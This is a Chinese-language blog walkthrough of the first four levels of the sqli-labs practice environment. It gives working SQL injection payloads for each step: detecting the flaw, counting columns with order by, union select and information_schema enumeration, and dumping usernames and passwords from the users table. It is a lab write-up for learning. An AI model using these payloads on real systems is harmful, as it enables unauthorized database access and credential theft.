@[TOC](sql-labs)

#  什么是sql-labs？
>SQL 注入（SQL Injection） 是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。 主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息
>推荐一个视频[【转载】SQL注入、SSTI&Docker逃逸 HTB CTF -GoodGame-哔哩哔哩](https://b23.tv/UY1Cx5T)
# Pass-01，02
这两个知识点，都没差...
网上查询得Pass-01基于单引号的SQL注入，Pass-02基于整数的注入
## 判断是否存在注入
用get传值id=1，随后能看到网页出现变化
![在这里插入图片描述](https://img-blog.csdnimg.cn/c0be8cab3d894317a423ebf5fed7be66.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)用get传值id=2，
![在这里插入图片描述](https://img-blog.csdnimg.cn/6b302c32bbe249ab8090f4f16d346e5c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
用get传值id=15之后，界面异常。
![在这里插入图片描述](https://img-blog.csdnimg.cn/87cc97841d6f40138d971a516c458367.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
有没有可能把?id=1,这个传参给它拼接到SQL语句中？并且被当做SQL代码进行执行？
尝试，?id=1 and 1=2...无变化。
![在这里插入图片描述](https://img-blog.csdnimg.cn/7e66849c9be04157a6bea7f1d092cf7c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
**Pass-02的知识从这开始**，尝试闭合?id=1'and 1=1-- za（后跟的字母随便...）
![在这里插入图片描述](https://img-blog.csdnimg.cn/909b90f69cf948e0bdfc68ea9427394d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
注意空格（格式），否则会报错，如图
![在这里插入图片描述](https://img-blog.csdnimg.cn/d342f1426f7e4609b23a73dfb0e5505d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
?id=1'and 1=2-- zaa，页面异常（可能存在SQL注入）
![在这里插入图片描述](https://img-blog.csdnimg.cn/ac819ee9153a4103b10c547a369f7d59.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
## 判断字段数
使用 order by 查询所有字段，从1开始直到4，发现3正常，但是4的页面异常（存在三个字段）
![在这里插入图片描述](https://img-blog.csdnimg.cn/cb700a391e0a4a9490bd13c751ef9270.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
## union select判断显错位（回显）
输入，?id=1'union select 1,2,3-- zaa，显示了前面的结果，
1,2,3:仅仅相当于占了三个位置（先前order by 查询为3），所以用什么表示均可。
![在这里插入图片描述](https://img-blog.csdnimg.cn/01f6df7124c54dcd8419d1481ed7e103.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
从而试着将id=1,改为id=15(因为页面没结果)
![在这里插入图片描述](https://img-blog.csdnimg.cn/3aa9395838fc4775982dc299ac8594ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
**注意：有文章说，已知这里面只有三列，找每一列的位置，使用  ?id=0' union select 1,2,3 --+  （要注意的是此处的id值必须是0以下的数字，否则不能成功）**
##  库名和登录用户名
将2的位置换为**database()**，显示当前页面数据库库名：security。
![在这里插入图片描述](https://img-blog.csdnimg.cn/74dddb310ea249d08af03d7d6c5103e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
查询当前数据库的库名和当前的登录用户名，使用  ?id=0' union select 1,database(),user() -- zaa
user()顶替3的位置，为当前的登录用户名。
![在这里插入图片描述](https://img-blog.csdnimg.cn/3898503fecb0432496795b1c730509b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)

## 判断表名
**?id=15'union select 1,table_name,3 from information_schema.tables where table_schema='security'-- zaa**
| table_name：代表表名 |  
|--|
|information_schema藏有自带的数据库  | 
| table_schema字面指库名 |  |
![在这里插入图片描述](https://img-blog.csdnimg.cn/58955874ff67410ab44170134c3f9def.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
**第二位（则第一位可用limit 0,1表示）**
?id=15'union select 1,table_name,3 from information_schema.tables where table_schema='security' **limit 1,1**-- zaa
![在这里插入图片描述](https://img-blog.csdnimg.cn/11562a9f3c9c4d17bed2417ccfd0dd93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
**第三位（limit 1,1中的前面的1改为2）**
即...?id=15'union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 2,1-- zaa
![在这里插入图片描述](https://img-blog.csdnimg.cn/92f2deb6361f437b8dfb76f7299c425a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
等...
## 判断列名
?id=15'union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='emails'-- zaa
**emails：可根据表进行替换**
![在这里插入图片描述](https://img-blog.csdnimg.cn/1e957ff1501a4e3cb5ad468e02c95fc0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
例：
?id=15'union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='referers'-- zaa
![在这里插入图片描述](https://img-blog.csdnimg.cn/207f8cece1464c7e8e6922607c3d7709.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
## 判断数据
?id=15'union select 1,id,3 from emails-- zaa
![在这里插入图片描述](https://img-blog.csdnimg.cn/d737aeeace354ac5b88f44b6c6ebee46.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
与上同，**emails：可根据表进行替换**
## 快法（要注意的是此处的id值必须是0以下的数字，否则不能成功）
将2的位置换为**database()**，显库名：security。
[参考文章...](https://blog.csdn.net/x647498949/article/details/122628708?ops_request_misc=&request_id=&biz_id=102&utm_term=sqli%E7%AC%AC%E4%B8%80%E5%85%B3&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-122628708.nonecase&spm=1018.2226.3001.4187)
### 表名
数据库库名后再爆破数据库，使用  ?id=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 --+  
![在这里插入图片描述](https://img-blog.csdnimg.cn/7791b331f93149b2870209c872da7dc3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
表名一步到位...
### 列名
?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and  table_name='**emails**'),3 --+
**emails：可根据表进行替换**
![在这里插入图片描述](https://img-blog.csdnimg.cn/7a2a6bf46a5a483196e1432e99b9b5a3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
### 数据名
格式?id=0' union select 1,(select group_concat(concat_ws(0x7e,表名对应的列名,表名对应的列名)) from 表名),3 --+
0x7e应该是个站位的...，其位置也可为表名对应的列名，观察02，03
#### 01
?id=0' union select 1,(select group_concat(concat_ws(0x7e,id,email_id)) from emails),3 --+ 进行爆破，得到以下内容。
![在这里插入图片描述](https://img-blog.csdnimg.cn/94c97e83fce94c4096270149abcbe811.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
#### 02
 ?id=0' union select 1,(select group_concat(concat_ws(**0x7e**,username,password)) from users),3 --+  进行爆破，得到以下内容。
![在这里插入图片描述](https://img-blog.csdnimg.cn/25d6fbb527544c77b4c58a2a78484379.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
#### 03
?id=0' union select 1,(select group_concat(concat_ws(**id**,username,password)) from users),3 --+  进行爆破，得到以下内容
![在这里插入图片描述](https://img-blog.csdnimg.cn/45be3f4169154987bd685c988a57bffb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
# Pass-03
查看源码...发现被框了。不会被当做代码，从而使代码失效。![在这里插入图片描述](https://img-blog.csdnimg.cn/fe92e2ded3c5470abc0a76d92073df24.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
从而'后加一个)
| 判断是否存在注入  | ?id=1')and 1=1-- za |
|--|--|
| 判断字段数 | ?id=1')order by 1-- za |
|union select判断显错位  | ?id=1')union select 1,2,3-- zaa |
| 判断表名 | ?id=15')union select 1,table_name,3 from information_schema.tables where table_schema='security'-- zaa |
| 判断列名 | ?id=15')union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='emails'-- zaa |
| 判断数据名 | ?id=15')union select 1,id,3 from emails-- zaa |
# Pass-04
由图与03相比单引变成了双引号...
![在这里插入图片描述](https://img-blog.csdnimg.cn/d8068ae6f3bb4a4c89a036a0d67b0a72.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16)
| 判断是否存在注入  | ?id=1")and 1=1-- za |
|--|--|
| 判断字段数 | ?id=1")order by 1-- za |
|union select判断显错位  | ?id=1")union select 1,2,3-- zaa |
| 判断表名 | ?id=15")union select 1,table_name,3 from information_schema.tables where table_schema='security'-- zaa |
| 判断列名 | ?id=15")union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='emails'-- zaa |
| 判断数据名 | ?id=15")union select 1,id,3 from emails-- zaa |
